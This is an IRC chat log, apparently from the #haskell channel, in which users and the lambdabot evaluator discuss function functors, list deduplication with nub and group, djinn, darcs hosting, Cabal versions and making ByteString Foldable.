10:39:12 <mauke> separates function parameters and body
10:39:20 <mrd> type constructor for functions
10:39:29 <mrd> or bit of syntax for lambda
10:39:30 <mauke> functional dependencies
10:39:54 <oerjan> > (\x -> x + 1) 2
10:39:58 <cizra> *sigh*
10:39:59 <lambdabot>  3
10:40:07 <oerjan> that's the lambda
10:40:18 <mauke> :t id
10:40:20 <lambdabot> forall a. a -> a
10:40:26 <cizra> Haskell is brain-twisting.
10:40:35 <sioraiocht> :t (->)
10:40:37 <lambdabot> parse error on input `->'
10:40:41 <mauke> :k (->)
10:40:43 <lambdabot> ?? -> ? -> *
10:40:46 <sioraiocht> okay
10:40:47 <oerjan> > case 3 of 1 -> "hi" ; _ -> "ho" -- case
10:40:49 <lambdabot>  "ho"
10:40:52 <sioraiocht> which one is that referring to
10:40:54 <Cale> cizra: -> and <- are both used in a variety of contexts in the Haskell syntax
10:41:02 <sioraiocht> that refers to the TYPE constructing arrow, right, mauke ?
10:41:12 <mauke> sioraiocht: yes
10:41:14 <sioraiocht> and also
10:41:19 <sioraiocht> @src (->) fmap
10:41:19 <lambdabot> fmap = (.)
10:41:20 <sioraiocht> WHY?
10:41:23 <sioraiocht> why is that the case?
10:41:26 <mauke> why not?
10:41:33 <mauke> it's the "obvious" definition :-)
10:41:35 <Cale> sioraiocht: think about the types
10:41:45 <mauke> sioraiocht: think of functions as lookup tables
10:41:50 <Cale> There's really only one way to treat functions from a fixed type as a functor
10:42:06 <Cale> fmap :: (a -> b) -> (f a -> f b)
10:42:11 <Cale> So when f = (e ->)
10:42:13 <Cale> we have
10:42:26 <Cale> fmap :: (a -> b) -> (e -> a) -> (e -> b)
10:42:34 <sioraiocht> OHHHHH
10:42:42 <Cale> but there's really only one thing that could be
10:42:48 <balodja> That's composition! :)
10:42:52 <mauke> @djinn (a -> b) -> (e -> a) -> (e -> b)
10:42:54 <lambdabot> f a b c = a (b c)
10:43:04 <sioraiocht> Functor is an instance of ((->) e) then?
10:43:09 <sioraiocht> so that it's kind is *->*?
10:43:15 <Cale> ((->) e) is an instance of Functor
10:43:20 <sioraiocht> err
10:43:20 <sioraiocht> right
10:43:21 <sioraiocht> sorry
10:43:23 <sioraiocht> omg
10:43:24 <Cale> It *should* be in the Prelude, but it's not.
10:43:28 <sioraiocht> my life
10:43:35 <sioraiocht> is much happier now
10:43:39 <oerjan> @free (a -> b) -> (e -> a) -> (e -> b)
10:43:40 <lambdabot> Pattern match failure in do expression at Plugin/Free/FreeTheorem.hs:54:20-34
10:43:49 <mauke> sioraiocht: do you know Reader?
10:43:55 <oerjan> @free f :: (a -> b) -> (e -> a) -> (e -> b)
10:43:55 <lambdabot> h . p = q . g => g . f1 = f2 . k => h . f p f1 = f q f2 . k
10:43:56 <sioraiocht> mauke: no
10:44:03 <mauke> ah
10:44:03 <sioraiocht> mauke: just havn't needed it
10:44:22 <mauke> well, newtype Reader e a = Reader (e -> a)
10:44:33 <mauke> i.e. it's just a thin wrapper around (->)
10:44:40 <Cale> sioraiocht: If you import Control.Monad.Instances, you'll get that instance
10:44:55 <Cale> (or Control.Monad.Reader)
10:44:59 <sioraiocht> thanks
10:45:12 <oerjan> Cale: actually i have a case for _not_ including (e ->) instances in the prelude - it makes it harder to detect wrong number of argument
10:45:19 <Cale> ((->) e) is not only a functor, but a monad as well.
10:45:21 <oerjan> *s
10:45:29 <Cale> oerjan: It does?
10:45:41 <Cale> How does it do that?
10:46:18 <Cale> The ((->) e) monad has a bunch of really nice consequences.
10:46:24 <GyroL> is there a function  Tree (m a)-> m (Tree a)?  (where Tree a is binary tree with things in the leaves)
10:46:26 <oerjan> by making things that have wrong number of arguments typecheck
10:46:38 <Cale> GyroL: Data.Traversable.sequence
10:46:43 <pjd> (.) = fmap, yay
10:46:45 <oerjan> if they are monadic actions, say
10:47:00 <Cale> GyroL: If you make whatever Tree type an instance of Traversable
10:47:03 <mrd> you can't write (-> e) as far as I know
10:47:06 <mrd> is that true
10:47:12 <koala_man> how do you parse a String as a number with some specified radix?
10:47:14 <Cale> mrd: Or (e ->) either
10:47:21 <mrd> but that is equal to ((->) e)
10:47:35 <Cale> mrd: Right, it's just that section syntax doesn't apply to types.
10:47:42 <mrd> is there any way to do (-> e)?
10:47:47 <Cale> No.
10:47:52 <Cale> Not without a newtype
10:47:59 <pjd> mrd: are you talking about the syntax, or the concept?
10:48:01 <mrd> this came up for me while I was playing with stupid stuff
10:48:04 <chessguy> i'm not coming up with the right algorithm for this problem for some reason
10:48:07 <mrd> the concept
10:48:09 <GyroL> Cale: Thanx, precisely what I was looking for.
10:48:13 <mrd> like (flip (->) e)
10:48:17 <pjd> in that case you can
10:48:46 <oerjan> (-> e) would be a contravariant function and co-monad, right?
10:48:50 <Cale> > sequence [id, (+2), (*2), (^2), (2^)] 5
10:48:50 <oerjan> *functor
10:48:54 <pjd> (-> e) is the contravariant counterpart to (e ->)
10:48:59 <lambdabot>  [5,7,10,25,32]
10:49:18 <Cale> oerjan: Contravariant functors aren't allowed to be comonads.
10:49:27 <chessguy> suppse you were analyzing network traffic for your web site. so you have a list like [234, 321, 412] which represents the number of hits at the end of January, February, and March, respectively. how would you turn that into a list of views each month?
10:49:45 <oerjan> hm...
10:49:56 <chessguy> it's sort of a stateful map
10:49:58 <mauke> some kind of accumulating walk
10:50:38 <mauke> check the usual suspects, i.e. zip, scanl, mapAccumL
10:50:45 <oerjan> chessguy: zipWith (-) . tail ?
10:50:51 <olsner> > let l = [234, 321, 412] in zipWith (-) l (tail l)
10:50:53 <lambdabot>  [-87,-91]
10:51:08 <olsner> > let l = [234, 321, 412] in zipWith (-) (tail l) l
10:51:09 <lambdabot>  [87,91]
10:51:11 <Cale> oerjan: A contravariant functor from Hask to Hask is really a covariant functor from Hask to Hask^op
10:51:14 <xerox> oerjan: ap (zipWith (-)) tail
10:51:23 <xerox> oh. nevermind.
10:51:27 <oerjan> Cale: i know, i was confused a bit
10:51:28 <Cale> oerjan: So it's not an endofunctor in the sense required for monads and comonads.
10:51:36 <xerox> join (zipWith (-) . tail)
10:51:57 <chessguy> so actually it's (head l) : zipWith...
10:52:03 <oerjan> Cale: i was confusing it with the Cont monad, which is a composition of two contravariant functors iirc
10:52:06 <vincenz> or
10:52:32 * chessguy tries to decide if he should write zipWith in javascript :)
10:52:51 <vincenz> > let l = [234, 321, 412] in zipWith (-) l (0:l)
10:52:52 <lambdabot>  [234,87,91]
10:52:56 <conal> oerjan: yep (composition)
10:53:05 <pjd> mrd: for (e ->), you have fmap :: (a -> b) -> f a -> f b
10:53:05 <pjd> which is to say, fmap :: (a -> b) -> (e -> a) -> (e -> b)
10:53:08 <mauke> > mapAccumL (\a x -> (x - a, x)) 0 [234, 321, 412]
10:53:10 <lambdabot>  (325,[234,321,412])
10:53:12 <chessguy> ooh, nice one, vincenz
10:53:19 <olsner> vincenz: hehe, just what I was about to write (by character!)
10:53:24 <mauke> > mapAccumL (\a x -> (x, x - a)) 0 [234, 321, 412]
10:53:26 <lambdabot>  (412,[234,87,91])
10:53:30 <esteban3> @src foldl
10:53:30 <lambdabot> foldl f z xs = lgo z xs
10:53:31 <lambdabot>     where lgo z []     =  z
10:53:31 <lambdabot>           lgo z (x:xs) = lgo (f z x) xs
10:53:47 <waern> conal: yes, you have to keep haddock and ghc in sync. regarding the $topdir error, I need to fix that, I'm not sure it's windows specific
10:53:59 <vincenz> Hobbies "Golfing in #haskell"
10:54:00 <mrd> pjd: ok
10:54:07 <mauke> @pl (\a x -> (x, x - a))
10:54:07 <lambdabot> ap (,) . subtract
10:54:24 <mauke> > mapAccumL (ap (,) . subtract) 0 [234, 321, 412]
10:54:25 <chessguy> @type zipWith
10:54:26 <lambdabot>  (412,[234,87,91])
10:54:27 <lambdabot> forall a b c. (a -> b -> c) -> [a] -> [b] -> [c]
10:54:57 <esteban3> can this be an alternate version of foldl? func (f:fs) a = (.) f func (fs) a ?
10:55:19 <pjd> mrd: that's gives you normal function composition:  fmap "replaces" the (a) result with a (b) result by composing (a -> b) to the end of (e -> a)
10:55:33 <esteban3>  func (f:fs) a = (.) f (func (fs) a) a
10:55:43 <Vulpyne> Why parenthize fs?
10:55:46 <mrd> right
10:55:58 <esteban3> not sure.. i have a problem with parenthizes. even typing it :(
10:56:10 <Vulpyne> Oh, okay. Just wondered if there was a reason.
10:56:12 <conal> waern: thanks for the sync info.  please let  me know about $topdir.
10:56:15 <esteban3> but can that work?
10:56:17 <waern> conal: oh, and that last error you mention is probably a ghc-on-windows error, yes. haven't seen it before..
10:56:32 <conal> waern: sigh.
10:56:37 <esteban3> > (.) (*3) (*2) 2
10:56:38 <lambdabot>  12
10:56:44 <Vulpyne> I'm not smart enough to do more than nit-pick the punctuation. :)
10:56:52 <pjd> mrd: for a contravariant functor, instead of fmap you have opfmap :: (a -> b) -> f b -> f a
10:57:14 <waern> conal: my macbook broke down last weekend (again), so now I don't have a computer.. but I'm often in school in front of one :-)
10:57:17 <esteban3> id better wait til next week so i can get to know myself the results of the exam
10:57:31 <waern> conal: I just got to get a good haskell environment up
10:58:05 <mrd> right, i was confused, because i knew that fmap on (e->) gives you composition. but i thought you were talking about contravariant then.
10:58:09 <pjd> which is to say, for (-> e), opfmap :: (a -> b) -> (b -> e) -> (a -> e)
10:58:14 <conal> waern: sure.  good luck with your macbook!  and some day i'll switch to linux.
10:58:25 <mrd> which is composition too
10:58:30 <pjd> right :)
10:58:30 <ricky_clarkson> @unpl (.) (*3) (*2)
10:58:31 <lambdabot> (\ c -> (c * 2) * 3)
10:58:34 <pjd> just on the other end
10:58:47 <pjd> pre-composing instead of post-composing
10:58:54 <ricky_clarkson> It appears lambdabot has similar parenthesis addictions.
10:59:02 <stepcut> I have a question, when you say, let x = ...., it is still correct to call 'x' a variable, even though it is not a mutable variable ?
10:59:06 <idnar> @djinn (a -> b) -> (b -> e) -> (a -> e)
10:59:06 <lambdabot> f a b c = b (a c)
10:59:12 <mauke> stepcut: yes
10:59:20 <ricky_clarkson> stepcut: Yes, a variable is only not a constant.
10:59:29 <puusorsa> nonvarying variable
10:59:35 <shapr> stepcut: Hey, is jabberbot source repo online?
10:59:40 <stepcut> ok, I know they are called variables in lambda calculus :)
10:59:41 <ricky_clarkson> It can be a different value on each run.
10:59:59 <oerjan> stepcut: variable is an old term from mathematics, where they were never mutable :)
11:00:21 <mrd> it is variable in that it could be instantiated with different values when you call the function
11:00:26 <stepcut> shapr: yes, http://www.n-heptane.com/nhlab/repos/
11:00:28 <lambdabot> Title: Index of /nhlab/repos
11:00:30 <shapr> thanks
11:00:35 <ricky_clarkson> x=x+1 is a mistake.
11:00:37 <stepcut> shapr: lamdabot-xmpp
11:00:48 <pjd> mrd: so (e ->) represents a function of fixed input type, with composition to change the output type, and (-> e) represents a function of fixed output type, with composition to change the input type
11:01:01 <shapr> spiffy!
11:01:14 <Saizan> ricky_clarkson: it's just an equation with no solution :)
11:01:14 <stepcut> shapr: it is based on a fairly old version of lambdabot now, and I think my xmpp library was a failure, but it does all work
11:01:17 <mrd> pjd: but you still can't write (-> e)
11:01:21 <ricky_clarkson> let idiocy x=x==x+1 in idiocy 16777216 :: Float
11:01:28 <crazy_coder> hello everyone
11:01:29 <ricky_clarkson> > let idiocy x=x==x+1 in idiocy 16777216 :: Float
11:01:30 <lambdabot>  Couldn't match expected type `Float' against inferred type `Bool'
11:01:30 <pjd> mrd: syntactically?
11:01:32 <shapr> hiya crazy_coder
11:01:41 <ricky_clarkson> > let idiocy x=x==x+1 in idiocy (16777216 :: Float)
11:01:42 <mrd> pjd: in any way
11:01:43 <lambdabot>  True
11:01:44 <crazy_coder> how to remove repeating elements from a list ?
11:01:47 <pjd> no, you can
11:01:47 <mrd> nub
11:01:54 <mauke> crazy_coder: map head . group
11:01:57 <vincenz> > let idiocy x=x==x+1 in idiocy (16777216 :: Double)
11:01:58 <lambdabot>  False
11:02:02 <mrd> pjd: well ok, that was my question originally
11:02:09 <stepcut> crazy_coder: adjacent repeating elements, or all duplicates ?
11:02:15 <crazy_coder> all duplicates
11:02:17 <ricky_clarkson> > let idiocy x=x==x+1 in idiocy (16777216 :: Double)^2
11:02:18 <lambdabot>   add an instance declaration for (Num Bool)
11:02:18 <lambdabot>     In the expression:
11:02:18 <lambdabot>         l...
11:02:28 <mrd> map head . group . sort -- if you dont mind an Ord constraint
11:02:32 <ricky_clarkson> > let idiocy x=x==x+1 in idiocy ((16777216 :: Double)^2)
11:02:34 <lambdabot>  False
11:02:40 <aFlag> is there a monad for nondeterminism? Something like prolog?
11:02:44 <mrd> nub -- only has an Eq constraint
11:02:45 <stepcut> > nub "hello, world"
11:02:46 <lambdabot>  "helo, wrd"
11:02:48 <crazy_coder> > map head [1,2,3,3]
11:02:51 <lambdabot>   add an instance declaration for (Num [a])
11:02:51 <lambdabot>     In the expression: 3
11:02:51 <stepcut> aFlag: LogicT
11:02:59 <conal> afFlag: []
11:02:59 <ricky_clarkson> Hmm, I thought 2^48+1 was 2^48 in IEEE 64-bit format.
11:03:13 <stepcut> aFlag: though, you can just use the List monad in some cases
11:03:15 <crazy_coder> > map head. group [1,2,3,3]
11:03:16 <lambdabot>  Couldn't match expected type `a -> [[a1]]'
11:03:17 <mauke> > (map head . group) [1,2,3,3]
11:03:19 <lambdabot>  [1,2,3]
11:03:21 <conal> afFlag: also Cont
11:03:31 <mrd> > map head . group $ [1,2,3,1]
11:03:33 <lambdabot>  [1,2,3,1]
11:03:38 <mrd> > map head . group . sort $ [1,2,3,1]
11:03:39 <lambdabot>  [1,2,3]
11:03:51 <aFlag> stepcut, I see, thanks
11:03:53 <crazy_coder> I didnt understand how it works
11:04:00 <mrd> > nub [1,2,3,1]
11:04:01 <lambdabot>  [1,2,3]
11:04:14 <crazy_coder> map head [x,y,z] ? what does that do ?
11:04:22 <mrd> applies head to every element of the list.
11:04:27 <mrd> [head x, head y, head z]
11:04:35 <mrd> > group [1,1,2,3]
11:04:36 <lambdabot>  [[1,1],[2],[3]]
11:04:39 <crazy_coder> head gives first element of list
11:04:48 <ricky_clarkson> > map head [[3,4],[5,6],[10,12]]
11:04:50 <lambdabot>  [3,5,10]
11:05:31 <ricky_clarkson> crazy_coder: You can kind of see how to try it out if you look at its type.
11:05:37 <ricky_clarkson> :t map head
11:05:40 <lambdabot> forall a. [[a]] -> [a]
11:05:41 <chessguy> somehow it comes out so much uglier in JS
11:05:42 <chessguy> 	var total = 0;
11:05:42 <chessguy> 	for (var i = 0; i < result_array.length; i++){
11:05:42 <chessguy> 	    result_array[i].views = result_array[i].views - total;
11:05:42 <chessguy> 	    total += result_array[i].views;
11:05:42 <chessguy> 	}
11:05:47 <crazy_coder> group collects all same terms in 1 sublist. right ?
11:06:03 <mauke> adjacent equal values
11:06:07 <ricky_clarkson> Pass it a list of lists of a, and it gives you a list of a back.
11:06:22 <crazy_coder> what if its not adjacent ?
11:06:23 <ricky_clarkson> :t group
11:06:25 <lambdabot> forall a. (Eq a) => [a] -> [[a]]
11:06:29 <luqui> @pl \obs -> f obs >>> g obs
11:06:29 <lambdabot> liftM2 (>>>) f g
11:06:53 <crazy_coder> group is std ?
11:07:13 <luqui> :t groupWith
11:07:15 <lambdabot> Not in scope: `groupWith'
11:07:22 <oerjan> :t groupBy
11:07:24 <lambdabot> forall a. (a -> a -> Bool) -> [a] -> [[a]]
11:07:34 <scandal> heh "Well in his defense this is on the git mailing list. Some guy comes on and says "Your baby's ugly and you're stupid." "
11:07:42 <scandal> oops, wrong window sorry
11:08:04 <mauke> > group ["foobarbazquux"]
11:08:06 <lambdabot>  [["foobarbazquux"]]
11:08:06 <ricky_clarkson> Open source is so friendly!
11:08:13 <mauke> > group "foobarbazquux"
11:08:14 <shapr> ricky_clarkson: So is microsoft.
11:08:15 <lambdabot>  ["f","oo","b","a","r","b","a","z","q","uu","x"]
11:08:25 <mrd> crazy_coder: that's why I used sort
11:08:33 <luqui> oh, I thought it sorted too..
11:08:34 <crazy_coder> oh ok
11:08:36 <mrd> crazy_coder: but look, just use "nub" ok? much simpler
11:08:36 <crazy_coder> I got it
11:08:46 <mauke> nub is also much slower
11:08:56 <crazy_coder> but does one have to import any file to use it ?
11:08:57 <mrd> O(n^2) vs O(nlog n)
11:09:00 <mrd> no.
11:09:09 <mauke> @index nub
11:09:10 <lambdabot> Data.List
11:09:15 <mauke> @index group
11:09:15 <mrd> also nub is laziness friendly
11:09:16 <lambdabot> Data.List
11:09:40 <mrd> > nubBy (\x y -> y `mod` x == 0) [2..]
11:09:42 <lambdabot>  [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,...
11:10:19 <luqui> ooh that's elegant
11:10:43 <mauke> > nubBy(((>0).).gcd)[2..]
11:10:48 <lambdabot> Terminated
11:11:00 <luqui> >1 probably
11:11:01 <mauke> > nubBy(((>1).).gcd)[2..]
11:11:03 <lambdabot>  [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,...
11:11:04 <ricky_clarkson> > nubBy (\x y -> [x,y]) [2..]
11:11:05 <lambdabot>  Couldn't match expected type `Bool' against inferred type `[a]'
11:11:20 <ricky_clarkson> > nubBy (\x y -> True) [2..]
11:11:24 <lambdabot> Terminated
11:12:21 <crazy_coder> whats the opposite of head ?
11:12:24 <luqui> > nubBy (\x y -> False) [2..]
11:12:25 <lambdabot>  [2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29...
11:12:33 <crazy_coder> list to return last element of list ?
11:12:33 <luqui> crazy_coder: either last or tail, depending on what you mean by opposite
11:12:44 <crazy_coder> last
11:12:47 <ricky_clarkson> @hoogle [a] -> a
11:12:49 <lambdabot> Prelude.head :: [a] -> a
11:12:49 <crazy_coder> thanks
11:12:49 <lambdabot> Prelude.last :: [a] -> a
11:12:49 <lambdabot> List.maximumBy :: (a -> a -> a) -> [a] -> a
11:12:58 <ricky_clarkson> crazy_coder: That's a way to find out ^^
11:13:37 <ricky_clarkson> @djinn [a] -> a
11:13:37 <lambdabot> -- f cannot be realized.
11:13:47 <mrd> lots of solutions
11:13:58 <ricky_clarkson> Does djinn only succeed if there's only one solution?
11:14:09 <oerjan> ricky_clarkson: it doesn't do lists
11:14:09 <luqui> djinn does not do lists
11:14:13 <ricky_clarkson> Ah.
11:14:14 <mrd> @djinn a -> a -> a
11:14:14 <lambdabot> f _ a = a
11:14:30 <luqui> @djinn a -> a -> (a,a)
11:14:30 <lambdabot> f a b = (b, a)
11:14:54 <luqui> four possibilities for that one, I wonder why it chose that one
11:15:24 <ari> Four?
11:15:34 <luqui> (a,a),(a,b),(b,a),(b,b)
11:15:55 * ari sees, and confirms that he was feeling stupid for a reason
11:16:05 <luqui> :-)
11:16:44 <oerjan> @djinn a -> (a,a)
11:16:45 <lambdabot> f a = (a, a)
11:22:22 <quicksilver> luqui: it's essentially a theorem prover, but it does have abias towrds relevance
11:22:43 * matthew-_ settles down with a nice large ricard
11:22:43 <quicksilver> luqui: that's why it prefers (b,a) to (a,a)
11:22:49 <quicksilver> tries to use up as many parameters as possible
11:23:42 <luqui> cool...
11:25:03 <quicksilver> @djinn a -> Maybe a -> a
11:25:04 <lambdabot> f a b =
11:25:04 <lambdabot>     case b of
11:25:04 <lambdabot>     Nothing -> a
11:25:04 <lambdabot>     Just c -> c
11:25:19 <quicksilver> (as oppose to the obvious f a b = a)
11:26:12 <quicksilver> @djinn Bool -> a -> b -> Either a b
11:26:13 <lambdabot> f a b c =
11:26:13 <lambdabot>     case a of
11:26:13 <lambdabot>     False -> Left b
11:26:13 <lambdabot>     True -> Right c
11:27:01 <quicksilver> @djinn Maybe a -> (a->b) -> c -> Either b c
11:27:02 <lambdabot> f a b c =
11:27:02 <lambdabot>     case a of
11:27:02 <lambdabot>     Nothing -> Right c
11:27:02 <lambdabot>     Just d -> Left (b d)
11:27:04 <roconnor> djinn seems to like using all information if possible.
11:27:08 <quicksilver> right
11:27:11 <roconnor> although I don't know how it figures that out.
11:27:17 <quicksilver> that's what "relevant"means
11:27:29 <quicksilver> although I don't think it works in any actual formalise relevant logic
11:27:33 <roconnor> quicksilver: oh sorry
11:27:36 <quicksilver> I thik it's a bit of a hack
11:27:42 <roconnor> quicksilver: you said that already
11:41:20 <dylan> hmm, where does one usually keep darcs repositories? I've been using /srv/darcs, but things become confusing when one keeps, say, the live version of a webpage under darcs...
11:43:35 <aFlag> I leave it in my home directory and give people access to it through a link on public_html
11:45:21 <dylan> so, say for multiple-person access, I have a given user that everyone pushes as, e.g. darcs push user@host:...
11:45:47 <dylan> would it be somewhat unsurprising to keeps the repos in that user's directory?
11:46:10 <dylan> s/keeps/keep
11:46:51 <aFlag> that should be ok
11:46:51 <tmoertel_away> bos: am I right that cabal-rpm 0.3.1 cannot be used w/ Cabal 1.1.6 (which is what ships w/ GHC 6.6.1)?
11:47:21 <aFlag> If I have lots of people pushing to my repository I usually create accounts for them and put them in the same group
11:47:32 <aFlag> but I keep the files in my home directory
11:47:39 <aFlag> the repository
11:49:39 <bos> tmoertel: yeah
11:49:54 <bos> cabal 1.1.6 doesn't expose enough internals
11:50:12 <bos> 1.2.0 is the first tagged release that has enough of its guts hanging out
11:50:38 <tmoertel> bos: ok
11:52:11 <monochrom> gross. guts hanging out
11:52:37 * monochrom lets his diaphragm hang out
12:01:57 * matthew-_ re-enacts the Simpson's sketch involving monochrom's "diaphragm"
12:02:22 <monochrom> haha
12:05:40 <luqui> @pl \(x,y) -> (y,x)
12:05:40 <lambdabot> uncurry (flip (,))
12:07:42 <chessguy> @type uncurry
12:07:45 <lambdabot> forall a b c. (a -> b -> c) -> (a, b) -> c
12:07:57 <oerjan> > (snd &&& fst) (0,1)
12:07:59 <lambdabot>  (1,0)
12:08:18 <chessguy> @type (snd &&& fst)
12:08:20 <lambdabot> forall a b. (a, b) -> (b, a)
12:10:20 <CosmicRay> hrm, does anyone know a clever way to resolve the kind mismatch when trying to make a ByteString an instance of Foldable?
12:11:27 <monochrom> perhaps explicit kind annotation. perhaps it is a real mistake.
12:11:57 <pgavin> the problem is that ByteString doesn't have a type parameter
12:12:10 <mrd> it isn't a functor
12:12:14 <pgavin> right
12:12:38 <CosmicRay> pgavin: but yet plain lists are a member of Foldable, which I have yet to quite understand how that works
12:12:41 <CosmicRay> pgavin: right
12:12:51 <mrd> ByteStrings are just plain funky
12:12:56 <pgavin> CosmicRay: because the list type takes a parameter
12:13:02 <pgavin> CosmicRay: e.g. [a]
12:13:06 <monochrom> Note that [Int] is not Foldable. [] is.
12:13:39 <pgavin> monochrom: how's that?
12:13:47 <oerjan> newtype FBS a = FBS ByteString (Byte -> a)
12:13:56 <oerjan> or whatever
12:13:57 <monochrom> ByteString has kind *, [Int] has kind *, [] has kind * -> *
12:14:19 <pgavin> monochrom: oh, ok, I misunderstood you :)
12:14:21 <UnaRacer> Hi, I'm having trouble building a package (c2hs 0.15.0) and I'm getting an error: "Warning: Unknown field 'build-tools'".
12:14:42 <UnaRacer> I'm using the debian GHC6.6 package.
12:14:55 <CosmicRay> monochrom: not true in [Int] not being Foldable.
12:14:56 <pgavin> UnaRacer: you need a newer cabal
12:15:04 <CosmicRay> I know what the instance says, but your statement is misleading
12:15:04 <sorear> UnaRacer: That doesn't look like an error to me
12:15:06 <CosmicRay> Prelude Data.Foldable> Data.Foldable.foldl (+) 0 [1, 2, 3, 4]
12:15:10 <sorear> UnaRacer: Why do you think it is one?
12:15:11 <CosmicRay> works
12:15:22 <UnaRacer> Ah, actually it's a warning.
12:15:30 <monochrom> In a year you will understand my statement.
12:15:31 <CosmicRay> monochrom: so is there a clever hack I can apply to ByteString to make it have kind * -> *?
12:15:34 <CosmicRay> monochrom: heh
12:15:36 <UnaRacer> The error is "Error: Non-empty library, but empty exposed modules list."
12:15:44 <oerjan> CosmicRay: i suggested one
12:15:56 <monochrom> [Int] is not a monad. [] is a monad.
12:16:14 <monochrom> sin(1), sin(x) are not functions. sin is a function.
12:16:31 <dcoutts> UnaRacer: the warning is not important
12:16:35 <CosmicRay> oerjan: but that is not seamless, right?  I mean, users would have to use FBS around their parameters all the time
12:16:48 <mrd> sin is a function of the devil.
12:16:52 <UnaRacer> I'll try a new Cabal.
12:16:57 <sorear> CosmicRay: Rewrite foldable using type families
12:17:01 <oerjan> yes.  that is usually the case whenever you circumvent the type system
12:17:07 <sorear> UnaRacer: that looks like it might be a c2hs bug
12:17:09 <sorear> dcoutts: ?
12:17:37 <monochrom> @type Foldable
12:17:37 <CosmicRay> sorear: is that actually in ghc and hugs released versions?
12:17:46 <lambdabot> Not in scope: data constructor `Foldable'
12:17:53 <monochrom> @type Data.Foldable.foldl
12:17:55 <lambdabot> forall a b (t :: * -> *). (Data.Foldable.Foldable t) => (a -> b -> a) -> a -> t b -> a
12:17:55 <CosmicRay> @type Data.Foldable.Foldable
12:17:57 <lambdabot>     Not in scope: data constructor `Data.Foldable.Foldable'
12:18:08 <CosmicRay> I guess @type doesn't work for classes
12:18:14 <CosmicRay> makes sense, I suppose
12:18:24 <mrd> @info Foldable
12:18:24 <lambdabot> (Foldable)
12:18:28 <sorear> fine, dysfunctional dependancies then
12:18:36 <sorear> @src Foldable
12:18:36 <lambdabot> Source not found. It can only be attributed to human error.
12:18:39 <monochrom> Note that it is (Foldable t) => ... -> t b ->..., not (Foldable t) => ... -> t -> ...
12:18:52 <monochrom> Thus, t can be [], but not [Int].
12:19:27 <CosmicRay> monochrom: I guess that there is some syntactic sugar going on here, that makes [] similar to, say, List, and [Int] similar to List Int...
12:19:28 <monochrom> Therefore, [Int] is not an instance of Foldable. When you use foldl on a [Int], it is [] not [Int] at work.
12:19:36 <monochrom> Yes.
12:19:51 <monochrom> You see this more clearly with Maybe vs Maybe Int.
12:20:09 <CosmicRay> monochrom: I understand the distinction, but since *any* list is Foldable, then a list of ints is Foldable.
12:20:40 <monochrom> That is wrong. We say Maybe is a Functor and Monad, not Maybe Int is a Functor and Monad.
12:20:48 <mrd> you can't write: instance Foldable [Int], basically
12:21:01 <CosmicRay> right, I understand that.
12:21:06 <mrd> that is what is meant by "not Foldable"
12:21:16 <monochrom> If you blame me for picking on syntax, then let's talk about semantics.
12:21:20 <CosmicRay> heh
12:21:43 <monochrom> What do you think the semantics of "instance Foldable ByteString" should be? What does foldl do?
12:22:16 <sjanssen> ByteString has the wrong kind
12:22:33 <pgavin> CosmicRay: if ByteString was implemented as data ByteString a = ... it would work
12:22:36 <CosmicRay> right, it is the wrong kind, but there is an obvious implementation of foldl for ByteStrings
12:22:42 <monochrom> It seems to me "(Foldable ByteString) => (a -> b -> a) -> a -> ByteString -> a" is not very implementable.
12:23:00 <CosmicRay> monochrom: nothing says that b must be a different type than a
12:23:02 <CosmicRay> err
12:23:10 <sorear> CosmicRay: if Foldable ByteString, then foldl :: (a -> b -> a) -> a -> ByteString b -> a
12:23:23 <sorear> CosmicRay: where are you going to get that ByteString b?
12:23:34 <sorear> CosmicRay: no well-formed expression has that type!
12:23:37 <monochrom> nothings say they must be the same either. also nothing says b must be Word8 or Char8.
12:23:41 <CosmicRay> we know that it is Word8, though.
12:23:49 <CosmicRay> @type Data.ByteString.foldl
12:23:51 <lambdabot> forall a. (a -> Word8 -> a) -> a -> Data.ByteString.Base.ByteString -> a
12:24:23 <monochrom> I don't know. You're using Haskell as though it's Python or something.
12:24:26 <CosmicRay> heh
12:24:33 <CosmicRay> I try my best ;-)
12:24:44 <CosmicRay> it seems a shame that we can't have a generic foldl
12:24:50 <CosmicRay> that would work both on lists and ByteStrings
12:24:51 <sjanssen> we can
12:25:00 <sjanssen> we just need a different Foldable class
12:25:01 <CosmicRay> restricted, of course, to Word8 elements with ByteStrings
12:25:16 <CosmicRay> sjanssen: would that be a multi-parameter class, or how would it be structured differently?
12:25:50 <sorear> just use type families or dysfunctional dependancies
12:25:53 <sjanssen> "class Foldable a where type Elem a :: *; foldr :: (Elem a -> b -> b) -> b -> a -> b; ..."
12:26:00 <sjanssen> CosmicRay: yes, MPTCs or type families
12:26:57 <vincenz> multi parented type classes can lead to quite extended type families
12:27:00 <vincenz> sounds rather redneck
12:27:05 <CosmicRay> sjanssen: It seems that type families are not yet ready for prime time.  I tried this with MPTCs and it worked with -fglasgow-exts but I could not make it work with hugs -98 +o, when I had any class function that did not require both of the type parameters
12:27:31 <mrd> type families just made it into GHC as of aug 28
12:27:44 <sorear> CosmicRay: that sounds like a bug in hugs
12:27:57 <CosmicRay> oh?  let me see if I can boil it down to a simple case then
12:29:11 <UnaRacer> Seems like I did need a new Cabal, and a few other dependencies.
12:29:12 <UnaRacer> Thanks.
12:31:28 <CosmicRay> class FooClass a b where
12:31:28 <CosmicRay>     myf1 :: a -> b
12:31:28 <CosmicRay>     myf2 :: a -> a
12:31:32 <CosmicRay> that works with ghc -fglasgow-exts
12:31:54 <CosmicRay> under hugs -98 +o, it gives an "Ambiguous type signature in class declaration" for myf2.  If I leave myf2 off, it works.
12:32:37 <poh> is this an appropriate place to ask noob haskell programming questions?
12:33:06 <Nafai> poh: Definitely
12:33:20 <Nafai> poh: People here are generally friendly and mostly smart! :)
12:33:20 <poh> Nafai: Great, thanks
12:33:26 <Saizan> CosmicRay: that's actually hugs warning you first, instead of letting you harm yourself later like ghc
12:33:48 <Saizan> CosmicRay: you need a functional dependency, like a -> b
12:34:39 <CosmicRay> are fundeps available in released versions of ghc and hugs?
12:34:44 <CosmicRay> I didn't think they were, either
12:34:51 <sjanssen> CosmicRay: yes, they've been around for years
12:34:54 <CosmicRay> oh.
12:35:00 <Saizan> CosmicRay: without it there's no way to choose which instance to use for myf2
12:35:36 <sjanssen> @seen shapr
